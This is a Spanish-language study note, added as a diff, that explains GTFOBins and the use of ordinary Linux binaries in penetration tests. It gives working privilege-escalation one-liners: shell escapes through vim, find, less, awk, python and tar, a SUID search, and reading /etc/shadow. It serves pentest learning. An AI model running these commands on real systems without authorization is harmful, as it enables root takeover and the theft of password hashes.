@@ -1,0 +1,146 @@
+🐚 Es una base de datos de binarios de Linux que pueden usarse para:
+
+	🔓 Escapar de restricciones
+	⬆️ Escalar privilegios
+	🐚 Obtener una shell
+	📂 Leer/escribir archivos sensibles
+
+🎯 Ejemplo rápido
+
+	Un comando aparentemente inofensivo:
+
+		vim
+
+	👉 Puede convertirse en una shell:
+
+		vim -c ':!/bin/bash'
+
+	💥 Ya tienes una shell
+
+🔥 ¿Por qué es tan importante?
+
+	Porque en un pentest:
+
+		· No siempre puedes subir exploits
+		· Pero SIEMPRE hay binarios en el sistema
+
+	👉 Y GTFOBins te dice cómo explotarlos
+
+⚙️ ¿Cómo se usa GTFOBins?
+
+	🧩 Paso 1: Enumeración
+
+		Buscas qué puedes ejecutar como root:
+
+			sudo -l
+
+	🧩 Paso 2: Encuentras un binario
+
+		Ejemplo:
+
+			(ALL) NOPASSWD: /usr/bin/find
+
+	🧩 Paso 3: Vas a GTFOBins
+
+		Buscas: find
+
+	🧩 Paso 4: Ejecutas el payload
+
+		sudo find . -exec /bin/bash \; -quit
+
+	💥 Shell como root
+
+🔥 Casos más comunes de uso
+
+	1️⃣ Escalada con sudo
+
+		👉 Cuando puedes ejecutar algo como root. Ejemplo:
+
+			sudo vim file.txt
+
+		➡️ En GTFOBins:
+
+			:!/bin/bash
+
+		💥 root shell
+
+	2️⃣ Binarios SUID
+
+		👉 Archivos que se ejecutan como root. Buscar:
+
+			find / -perm -4000 2>/dev/null
+
+		Ejemplo vulnerable:
+
+			/usr/bin/nmap
+
+		➡️ En GTFOBins ves cómo explotarlo
+
+	3️⃣ Lectura de archivos sensibles
+
+		Ejemplo:
+
+			sudo cat /etc/shadow
+
+		O usando otros binarios como:
+
+			less /etc/shadow
+
+	4️⃣ Escritura de archivos
+
+		👉 Puedes modificar cosas críticas:
+
+			/etc/passwd
+			scripts root
+			cron jobs
+
+	5️⃣ Reverse shells
+
+		Algunos binarios permiten:
+
+			👉 Conectar tu máquina con la víctima
+
+🧪 Ejemplos típicos (muy usados)
+
+	🔹 con less
+
+		less file.txt
+
+		Dentro:
+
+			!/bin/bash
+
+	🔹 con awk
+
+		awk 'BEGIN {system("/bin/bash")}'
+
+	🔹 con python
+
+		python3 -c 'import os; os.system("/bin/bash")'
+
+	🔹 con tar
+
+		tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+🚨 Importante (muy clave)
+
+	👉 GTFOBins NO es un exploit. Es:
+
+		· Una guía de abuso de binarios
+		· Basada en malas configuraciones
+
+🧠 GTFOBins = lista de comandos de Linux que puedes abusar para escalar privilegios
+
+	Se usa cuando:
+
+		· Tienes acceso limitado
+		· Encuentras permisos raros (sudo, SUID)
+		· Quieres una shell
+
+	Flujo real:
+
+		1. Acceso inicial
+		2. sudo -l
+		3. Buscar binarios
+		4. Mirar en GTFOBins
+		5. Escalar privilegios
